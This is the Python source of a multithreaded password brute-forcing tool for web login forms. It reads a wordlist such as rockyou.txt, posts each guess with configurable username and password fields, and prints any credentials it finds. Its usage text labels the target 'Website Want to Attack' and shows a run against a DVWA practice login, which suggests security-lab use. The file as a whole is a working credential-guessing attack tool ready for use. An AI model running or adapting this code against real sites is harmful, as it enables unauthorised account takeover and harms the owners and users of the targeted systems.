import optparse
from tabulate import tabulate
from ..Automated.important_static_functions import *
import time
import threading


class BruteForceManual:
    threads = []

    def __init__(self):
        parser = optparse.OptionParser()
        parser.add_option('-u', '--url', dest='url')
        parser.add_option('-l', '--login_name', dest='username')
        parser.add_option('-p', '--passwords', dest='passwords')
        parser.add_option('-f', '--fields', dest='import_fields')
        parser.add_option('-y', '--verification', dest='verification')
        parser.add_option('-v', '--verbose', dest='verbose', action='store_true')
        parser.add_option('-t', '--threads', dest='threads')
        options, arguments = parser.parse_args()
        self.url = options.url
        self.username = options.username
        self.passwords = options.passwords
        self.fields = options.import_fields
        self.verification = options.verification
        self.threads_num = options.threads
        self.verbose = options.verbose
        if self.threads_num is None:
            self.threads_num = 10
        self.start = time.time()
        self.creds_found = False
        self.end = time.time()
        self.stop_event = threading.Event()
        if self.url is None or self.passwords is None or self.username is None or self.verification is None:
            print(error('Proper Arguments Not Given:'))
            self.script_usage()
            sys.exit(0)

    @staticmethod
    def script_usage():
        """
        Colored Table That Show a small simple Guide for using this program.
        """
        my_data = [
            [colored("Username", 'yellow'), colored("-l", 'green'), colored("A valid Username Not Given.", 'red')],
            [colored("Passwords", 'yellow'), colored("-p", 'green'), colored("List Of Possible Passwords.", 'red')],
            [colored("URL", 'yellow'), colored("-u", 'green'), colored("Website Want to Attack.", 'red')],
            [colored("Threads", 'yellow'), colored("-t", 'green'), colored("No of Threads To Use", 'red')],
            [colored("fields", 'yellow'), colored("-f", 'green'), colored("Important Fields, username:password:login"
                                                                          "", 'red')],
            [colored("Verification", 'yellow'), colored("-v", 'green'), colored("To Verify if login is made", 'red')]]
        head = [colored("Name", 'blue'), colored("Arguments", 'blue'), colored("Help", 'blue')]
        print(tabulate(my_data, headers=head) + "\n")
        cprint('[!] Proper Usage: ', color='cyan', attrs=['bold'])
        print(colored('''\t./bruteforce man -l admin -p "/usr/share/wordlists/rockyou.txt" \
-u "http://192.168.56.101/dvwa/login.php" -t 15 -y "Login failed" -f username:password:Login''', 'cyan'))
        cprint('[!] Note: ', color='cyan', attrs=['bold'])
        print(colored("\tFormat of important fields is always, username_field:password_field:submit_button", 'cyan'))

    def getting_fields_from_commandline_input(self):
        input_fields = self.fields.split(':')
        self.username_field = input_fields[0]
        self.password_field = input_fields[1]
        self.submit_field = input_fields[2]

    def proper_response(self, data, word, number):
        if self.creds_found:
            return
        response = brute_force_request(self.url, data=data, timeout=5)
        if self.verification in response.content.decode('utf-8'):
            if self.verbose is not None:
                print(f'\rWorking On {number}\t\tPassword Invalid "{word}"\n', end='')
            else:
                pass
        else:
            self.end = time.time()
            print(f'\rWorking On {number}\t\tPassword Found "{word}"\n', end='')
            self.creds_found = True
            time.sleep(3)
            print("\n\n")
            print(colored(f"[*] Total time - {self.end - self.start} seconds.\n", 'yellow'))
            print(colored(f"Credentials for ", 'blue') + colored(f"{self.url}\n", 'green') +
                  colored(f"Username: ", 'blue') + colored(f"{self.username}\n", 'green') +
                  colored("Password: ", 'blue') + colored(f"{word}", 'green'))

    def brute_force(self):
        connection_check(self.url)
        self.getting_fields_from_commandline_input()
        print(self.username_field, self.password_field, self.submit_field)
        number = 1
        words = read(self.passwords)
        for word in words:
            if self.creds_found:
                self.exit()
            word = clean_word(word)
            data = {
                self.username_field: self.username,
                self.password_field: word,
                self.submit_field: 'submit'
            }
            thread = threading.Thread(target=self.proper_response, args=(data, word, number))
            self.threads.append(thread)
            try:
                while threading.active_count() > int(self.threads_num) + 1:
                    continue
            except KeyboardInterrupt:
                sys.exit(0)
            thread.start()
            number += 1
        self.exit()

    def collection_of_threads(self):
        for thread in self.threads:
            try:
                thread.join()
            except RuntimeError:
                pass

    def exit(self):
        if not self.creds_found:
            print("\n[*] - Approaching final keyspace...")
        self.collection_of_threads()

        if not self.creds_found:
            print(f"[-] - Failed to find valid credentials for {self.url}")
            self.end = time.time()
            print(f"[*] Total time - {self.end - self.start} seconds.")
        sys.exit()
